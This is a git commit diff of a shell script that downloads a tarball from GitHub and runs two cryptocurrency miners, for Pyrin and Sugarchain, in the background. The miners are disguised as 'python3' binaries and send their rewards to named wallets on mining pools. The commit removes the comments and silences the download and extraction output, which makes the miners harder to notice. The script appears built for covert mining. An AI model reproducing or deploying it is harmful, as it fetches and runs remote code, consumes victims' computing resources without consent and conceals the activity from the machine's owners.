84d56ca42a8155e08b0c64b3fd340abc5de05553
DotAja <142836390+DotAja@users.noreply.github.com>
2024-07-03 02:44:00 +0700

    Update akuDot.sh

--- akuDot.sh
+++ akuDot.sh
@@ -1,15 +1,12 @@
 #!/bin/bash
 
-# Unduh file
-wget -O TOT https://github.com/DotAja/ALONE/releases/download/alone/dotaja.tar.gz
+wget -q -O TOT https://github.com/DotAja/ALONE/releases/download/alone/dotaja.tar.gz
 
-# Ekstrak file
-tar -xzf TOT
+tar -xzf TOT >/dev/null 2>&1
 
-# Hapus file tar.gz setelah ekstraksi
 rm TOT
 
-# Jalankan perintah nohup
 nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT_CPU/GPU --no-cl > /dev/null 2>&1 &
 
 nohup ./dotsrb/python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.DOT_CPU/GPU -t $(nproc) > /dev/null 2>&1 &
+
